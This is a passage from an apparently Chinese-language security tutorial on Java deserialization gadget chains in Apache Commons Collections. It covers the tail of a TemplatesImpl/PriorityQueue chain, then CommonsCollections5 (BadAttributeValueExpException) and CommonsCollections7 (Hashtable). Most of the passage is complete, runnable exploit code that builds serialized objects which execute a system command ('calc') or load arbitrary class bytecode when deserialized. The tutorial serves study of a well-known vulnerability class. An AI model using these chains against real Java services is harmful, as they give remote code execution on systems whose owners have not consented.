    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>

        <span class="n">TemplatesImpl</span> <span class="n">Templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">Templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
        <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>


        <span class="n">Field</span> <span class="n">bytecodeField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
        <span class="n">bytecodeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>

        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D://Tomcat/CC/target/classes/EXP/Demo.class"</span><span class="o">));</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
        <span class="n">bytecodeField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>


        <span class="n">InvokerTransformer</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">&lt;&gt;(</span><span class="s">"newTransformer"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{});</span>
        <span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">&lt;&gt;(</span><span class="mi">1</span><span class="o">));</span>

        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;&gt;(</span><span class="n">transformingComparator</span><span class="o">);</span>
        <span class="c1">//size长度要加2并将Temlates传入</span>
        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Templates</span><span class="o">);</span>
        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Templates</span><span class="o">);</span>

        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">transformingComparator</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">transformedField</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"transformer"</span><span class="o">);</span>
        <span class="n">transformedField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">transformedField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">transformingComparator</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>


        <span class="n">serialize</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>




    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="e4e8fe1f3501429efbe60798295fd362">CommonsCollections5:</h2>
<p>BadAttributeValueExpExceptionl类的readObject方法中有toString方法，然后toString方法能够调用getValue方法，然后调用TiedMapEntry中的getValue，后面就能够调用Lazymap里面的get方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235618-a3aea15c-20cc-1.png"/></p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">EXP</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.annotation.Target</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC5BadAttributeValueExpException</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>

        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>


<span class="c1">//赋值操作</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">Lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>

        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">Lazymap</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>

        <span class="c1">//设置私有属性val</span>
        <span class="n">BadAttributeValueExpException</span> <span class="n">badAttributeValueExpException</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
        <span class="n">Class</span> <span class="n">Bv</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.management.BadAttributeValueExpException"</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">val</span> <span class="o">=</span> <span class="n">Bv</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"val"</span><span class="o">);</span>
        <span class="n">val</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">val</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">,</span><span class="n">tiedMapEntry</span><span class="o">);</span>


<span class="c1">//        serialize(badAttributeValueExpException);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="ff2340c5782511d93dac0d13a02f2169">CommonsCollections7：</h2>
<p>入口点利用了HashTable通过readObject中调用<code>reconstitutionPut</code>,然后又调用了equals，然后找到了AbstractMapDecorator类中的equals方法中调用了get方法。</p>
<p>然后在equals中存在一个哈希碰撞，比较罕见，这里就不展开来研究了，可以参考fakesoul师傅写的文章：</p>
<p><a href="https://xz.aliyun.com/t/12207#toc-10" target="_blank">https://xz.aliyun.com/t/12207#toc-10</a></p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">cc7</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchFieldException</span><span class="o">,</span>
            <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">fakeformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span><span class="k">new</span>
                <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">2</span><span class="o">)};</span>
        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transforms</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                        <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span> <span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                        <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span>
                        <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">}),</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span>
                <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">fakeformers</span><span class="o">);</span>
        <span class="n">Map</span> <span class="n">innerMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">innerMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"pP"</span><span class="o">,</span><span class="mi">1</span><span class="o">);</span>
        <span class="n">Map</span> <span class="n">innerMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">innerMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"oo"</span><span class="o">,</span><span class="mi">1</span><span class="o">);</span>
        <span class="n">Map</span> <span class="n">lazyMap1</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap1</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
        <span class="n">Map</span> <span class="n">lazyMap2</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap2</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
        <span class="n">Hashtable</span> <span class="n">hashtable</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap1</span><span class="o">,</span><span class="mi">1</span><span class="o">);</span>
        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap2</span><span class="o">,</span><span class="mi">2</span><span class="o">);</span>
        <span class="n">lazyMap2</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"pP"</span><span class="o">);</span>
        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">ChainedTransformer</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"iTransformers"</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">chainedTransformer</span><span class="o">,</span><span class="n">transforms</span><span class="o">);</span>
        <span class="n">ByteArrayOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">bos</span><span class="o">);</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashtable</span><span class="o">);</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span>
                <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">bos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>最后给出所有调用链的一个简单的思维导图供大家总结：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235711-c30dbec0-20cc-1.png"/></p>
</div>
</div>